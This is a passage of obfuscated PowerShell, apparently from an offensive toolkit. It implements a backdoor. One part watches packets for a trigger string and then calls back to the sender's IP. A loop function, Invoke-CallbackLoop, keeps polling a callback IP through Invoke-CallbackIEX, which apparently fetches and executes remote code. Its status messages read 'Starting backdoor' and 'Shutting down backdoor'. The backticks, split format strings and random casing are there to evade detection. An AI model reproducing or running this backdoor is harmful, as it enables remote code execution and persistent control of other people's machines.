		${sOur`ce`i`padDrESS} = [System.Net.IPAddress]${SOu`R`cEIPAD`d`REss}
		${D`E`StInAt`ioNIP`AddrE`sS} = ${bINA`R`YrEaDEr}.("{2}{0}{1}"-f 'U','Int32','Read').Invoke()
		${D`e`STinaTionipAddR`ESs} = [System.Net.IPAddress]${d`Es`TInat`IO`NIPA`DdReSS}
		${RE`mAiNd`e`RByTeS} = ${b`INARYRE`Ader}.("{0}{3}{2}{1}"-f 'R','s','adByte','e').Invoke(${ME`M`OrYStr`EAM}."le`NGtH")
		
		
		${AS`ci`iEn`COdING} = &("{2}{3}{0}{1}"-f'j','ect','n','ew-ob') ("{5}{3}{2}{4}{0}{1}"-f't.asciienc','oding','t','ys','em.tex','s')
		${RE`mAIn`dErOf`PAc`KEt} = ${a`S`CiiENCODING}.("{0}{2}{1}"-f'G','tString','e').Invoke(${reMain`D`er`ByTeS})
		
		
		${bIN`ARYre`AdER}.("{0}{1}" -f 'Clo','se').Invoke()
		${MEmor`y`ST`ReAm}.("{1}{0}" -f 'se','Clo').Invoke()
		
		
		if (${R`eMainD`E`ROFp`AcKet} -match ${TR`IgGeR})
		{
			&("{1}{2}{0}" -f 'host','writ','e-') ("{1}{0}"-f 'atch: ','M') ${SOurceIpA`d`dre`ss}
			${rUNni`Ng}=${F`A`lSE}
			${m`AtcH} = ${SOu`RCE`IpAD`D`ResS}
		}
	}
	
	if(${m`AT`CH})
	{
		if(${CaLL`B`AcKiP})
		{
			${su`Cc`EsS} = &("{3}{2}{5}{0}{4}{1}"-f 'ck','X','l','Invoke-Cal','IE','ba') ${C`ALlba`c`kiP}
		}
		else
		{
			${SUcCe`SS} = &("{1}{3}{5}{0}{2}{4}" -f'allba','Invo','ckI','k','EX','e-C') ${MAt`ch}
		}
	}
	
}

function iNV`OkE-`CaLLBAcklO`op
{

	Param(  
	[Parameter(MaNDaTorY=${TR`Ue},POSITION=1)]
	[string]${ca`lLb`ACkiP},
	[Parameter(MANdAtoRy=${f`A`lse},POsItioN=2)]
	[int]${TIm`E`out}=0,
	[Parameter(MAnDatORy=${F`Al`SE},poSitIon=3)]
	[int] ${s`lEep}=1
	)
	
		
	&("{0}{2}{1}"-f 'w','ost','rite-h') ('T'+'imeo'+'ut:'+' '+"$Timeout")
	&("{0}{1}{3}{2}" -f 'w','ri','-host','te') ('Sleep'+': '+"$Sleep")
	&("{1}{0}{2}"-f 'e','writ','-host') ('Call'+'backIP:'+' '+"$CallbackIP")
	&("{2}{1}{0}"-f 'host','e-','writ')
	&("{0}{2}{1}" -f 'w','t','rite-hos') ("{2}{0}{1}{3}"-f'ng back','d','Starti','oor...')
	
	
	${rUN`N`Ing}=${t`RUE}
	${m`At`ch} =""
	${ST`AR`TTIME} = &("{1}{0}" -f 't-date','ge')
	while(${Run`N`ing})
	{
		
		if (${TiME`o`uT} -ne 0 -and ($( (  &("{0}{2}{3}{1}" -f 'gE','E','t-vArIA','BL')  ('c'+'qm') -ValueoNlY  )::"N`OW") -gt ${s`TAr`TTIMe}.("{0}{2}{1}"-f'add','conds','se').Invoke(${T`i`MeOut})))  
		{
			${Ru`NnI`NG}=${fAL`Se}
		}
		
		${cheCks`uc`CESs} = &("{1}{2}{3}{0}{4}" -f'E','Invoke-Ca','llbac','kI','X') ${C`AL`lB`AcKIp} -Silent ${TR`uE}
		
		if(${c`h`ECksU`CceSS} -eq 1)
		{
			${rUNNI`NG}=${FA`LsE}
		}
		
		&("{1}{0}" -f 'ep','sle') -s ${s`LeEp}
	}
	
	&("{0}{2}{1}"-f 'wr','e-host','it') ("{0}{2}{1}{4}{3}"-f 'Sh','ing d','utt','r...','own backdoo')
}